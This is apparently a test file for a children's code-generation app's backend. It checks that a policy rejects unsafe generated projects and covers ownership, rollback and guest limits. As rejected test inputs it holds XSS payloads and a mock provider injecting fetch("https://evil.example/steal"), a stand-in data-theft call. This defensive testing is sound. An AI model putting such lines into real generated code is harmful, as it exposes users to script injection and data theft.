import request from 'supertest';
import pino from 'pino';
import { createApp } from '../src/app.js';
import { loadConfig } from '../src/config/env.js';
import { MockAIProvider } from '../src/providers/ai/mock/MockAIProvider.js';
import { createAIService } from '../src/modules/ai/ai.service.js';
import { enforceGenerationPolicy } from '../src/modules/projects/generation.policy.js';
import { createFakeSupabase } from './helpers/fakeSupabase.js';

const PARENT = { id: '123e4567-e89b-42d3-a456-426614174001' };
const OTHER = { id: '123e4567-e89b-42d3-a456-426614174002' };
const CHILD = '123e4567-e89b-42d3-a456-426614174099';
const silent = { warn() {}, info() {}, error() {} };

const mock = new MockAIProvider();
const makePlan = async (prompt = 'a quiz about space') =>
  (await mock.generateProjectPlan({ prompt, language: 'en' })).data;
const goodCode = async () => (await mock.generateProjectCode({ plan: await makePlan() })).data;

function setup({ provider, supabaseOpts = {}, env = {} } = {}) {
  const supabase = createFakeSupabase({
    users: { a: PARENT, b: OTHER },
    tables: {
      child_profiles: [
        {
          id: CHILD,
          parent_id: PARENT.id,
          display_name: 'Mia',
          age: 9,
          avatar_key: 'fox',
          explanation_language: 'en',
          interests: [],
          deleted_at: null,
        },
      ],
    },
    ...supabaseOpts,
  });
  const config = loadConfig({ AI_RETRY_BASE_MS: '0', ...env });
  const deps = { supabase };
  if (provider) deps.ai = createAIService({ provider, config, supabase, logger: silent });
  const app = createApp(config, pino({ level: 'silent' }), deps);
  const as = (token) => (req) =>
    req.set('Authorization', `Bearer ${token}`).set('X-Child-Id', CHILD);
  const generate = async (body, token = 'a') =>
    as(token)(request(app).post('/api/v1/projects/generate')).send(
      body ?? { plan: await makePlan() },
    );
  return { app, supabase, generate, as };
}

describe('generation policy', () => {
  const withFile = async (path, content) => {
    const data = await goodCode();
    return { ...data, files: data.files.map((f) => (f.path === path ? { ...f, content } : f)) };
  };

  it('accepts the sample projects', async () => {
    for (const p of ['a game', 'a quiz', 'a calculator', 'an animation', 'a website']) {
      const plan = await makePlan(p);
      const { data } = await mock.generateProjectCode({ plan });
      expect(enforceGenerationPolicy(data).files).toHaveLength(3);
    }
  });

  it.each([
    ['index.html', '<script src="https://cdn.example/x.js"></script>'],
    ['index.html', '<script>alert(1)</script>'],
    ['index.html', '<iframe src="script.js"></iframe>'],
    ['index.html', '<form action="script.js"></form>'],
    ['index.html', '<img src="//evil.example/a.png">'],
    ['index.html', '<a href="javascript:alert(1)">x</a>'],
    ['index.html', '<link rel="stylesheet" href="https://fonts.example/f.css">'],
    ['style.css', '@import url("https://x.example/a.css");'],
    ['style.css', 'body { background: url(https://x.example/a.png); }'],
    ['script.js', 'fetch("/api")'],
    ['script.js', 'const x = new XMLHttpRequest();'],
    ['script.js', 'import x from "./y.js";'],
    ['script.js', 'const u = "https://evil.example";'],
    ['script.js', 'new WebSocket("wss://x")'],
    ['script.js', ''],
  ])('rejects %s containing %s', async (path, content) => {
    await expect(
      Promise.resolve().then(async () => enforceGenerationPolicy(await withFile(path, content))),
    ).rejects.toMatchObject({ code: 'AI_INVALID_RESPONSE' });
  });

  it('rejects extra, missing, duplicate, oversized or mislabelled files', async () => {
    const data = await goodCode();
    const extra = {
      ...data,
      files: [...data.files, { path: 'more.js', language: 'javascript', content: 'x' }],
    };
    const missing = { ...data, files: data.files.slice(0, 2) };
    const dup = { ...data, files: [data.files[0], data.files[0], data.files[2]] };
    const big = await withFile('script.js', 'a'.repeat(200 * 1024 + 1));
    const wrong = { ...data, files: data.files.map((f) => ({ ...f, language: 'html' })) };
    for (const bad of [extra, missing, dup, big, wrong]) {
      expect(() => enforceGenerationPolicy(bad)).toThrow();
    }
  });
});

describe('POST /projects/generate', () => {
  it('saves a project with version 1, manifest rows and stored files', async () => {
    const { generate, supabase } = setup();
    const res = await generate();
    expect(res.status).toBe(201);
    const { project, version, files, validated, isMock } = res.body.data;
    expect(project.projectType).toBe('quiz');
    expect(version).toMatchObject({ versionNumber: 1, origin: 'generated' });
    expect(files.map((f) => f.path)).toEqual(['index.html', 'style.css', 'script.js']);
    expect(validated).toBe(true);
    expect(res.body.data.validation).toMatchObject({ valid: true, errors: [] });
    expect(isMock).toBe(true);

    expect(supabase.db.projects).toHaveLength(1);
    expect(supabase.db.projects[0]).toMatchObject({
      child_profile_id: CHILD,
      guest_session_id: null,
      current_version_id: version.id,
    });
    expect(supabase.db.project_versions[0].project_plan.title).toBe(project.title);
    expect(supabase.db.project_files).toHaveLength(3);
    for (const row of supabase.db.project_files) {
      expect(row.content_hash).toMatch(/^[0-9a-f]{64}$/);
      expect(supabase.objects.has(row.storage_key)).toBe(true);
      expect(row.storage_key).toContain(`child/${CHILD}/${project.id}/v1/`);
    }
  });

  it('reads the project back, owner-scoped, with verified contents', async () => {
    const { generate, as, app, supabase } = setup();
    const { project } = (await generate()).body.data;
    const ok = await as('a')(request(app).get(`/api/v1/projects/${project.id}`));
    expect(ok.status).toBe(200);
    expect(ok.body.data.files).toHaveLength(3);

    const { token } = (await request(app).post('/api/v1/auth/guest-session')).body.data;
    const guest = await request(app)
      .get(`/api/v1/projects/${project.id}`)
      .set('X-Guest-Token', token);
    expect(guest.status).toBe(404); // another owner cannot see it

    const key = supabase.db.project_files[0].storage_key;
    supabase.objects.set(key, 'tampered');
    const bad = await as('a')(request(app).get(`/api/v1/projects/${project.id}`));
    expect(bad.status).toBe(500);
  });

  it('rejects another parent’s child, bad plans, and unsafe prompts', async () => {
    const { generate } = setup();
    expect((await generate(undefined, 'b')).status).toBe(404);
    expect((await generate({ plan: { title: 'x' } })).status).toBe(400);
    const plan = await makePlan();
    expect((await generate({ plan, extra: 1 })).status).toBe(400);
    expect((await generate({ plan: { ...plan, files: ['index.html', 'evil.php'] } })).status).toBe(
      502,
    );
    expect((await generate({ plan: { ...plan, description: 'visit https://x.io' } })).status).toBe(
      502,
    );
    const unsafe = await generate({ plan, prompt: 'a game where I kill people' });
    expect(unsafe.status).toBe(422);
    expect(unsafe.body.error.code).toBe('PROMPT_NOT_ALLOWED');
  });

  it('saves nothing when the provider returns forbidden code', async () => {
    class Evil extends MockAIProvider {
      async generateProjectCode(input) {
        const r = await super.generateProjectCode(input);
        r.data.files[2].content = 'fetch("https://evil.example/steal")';
        return r;
      }
    }
    const { generate, supabase } = setup({ provider: new Evil() });
    const res = await generate();
    expect(res.status).toBe(502);
    expect(JSON.stringify(res.body)).not.toContain('evil');
    expect(supabase.db.projects).toHaveLength(0);
    expect(supabase.objects.size).toBe(0);
  });

  it('rolls back rows and stored files if saving fails part-way', async () => {
    const failFiles = setup({ supabaseOpts: { failInsert: (table) => table === 'project_files' } });
    const a = await failFiles.generate();
    expect(a.status).toBe(500);
    expect(failFiles.supabase.db.projects).toHaveLength(0);
    expect(failFiles.supabase.objects.size).toBe(0);

    const failUpload = setup({ supabaseOpts: { failUpload: (key) => key.endsWith('script.js') } });
    const b = await failUpload.generate();
    expect(b.status).toBe(500);
    expect(failUpload.supabase.db.projects).toHaveLength(0);
    expect(failUpload.supabase.objects.size).toBe(0);
  });

  it('enforces the guest project limit and keeps guests separate from children', async () => {
    const { app, supabase } = setup({ env: { GUEST_MAX_PROJECTS: '1' } });
    const { token } = (await request(app).post('/api/v1/auth/guest-session')).body.data;
    const plan = await makePlan();
    const post = () =>
      request(app).post('/api/v1/projects/generate').set('X-Guest-Token', token).send({ plan });
    const first = await post();
    expect(first.status).toBe(201);
    expect(supabase.db.projects[0]).toMatchObject({ child_profile_id: null });
    const second = await post();
    expect(second.status).toBe(409);
    expect(second.body.error.code).toBe('GUEST_LIMIT_REACHED');
    expect(supabase.db.projects).toHaveLength(1);
  });

  it('requires authentication', async () => {
    const { app } = setup();
    expect((await request(app).post('/api/v1/projects/generate').send({})).status).toBe(401);
  });
});
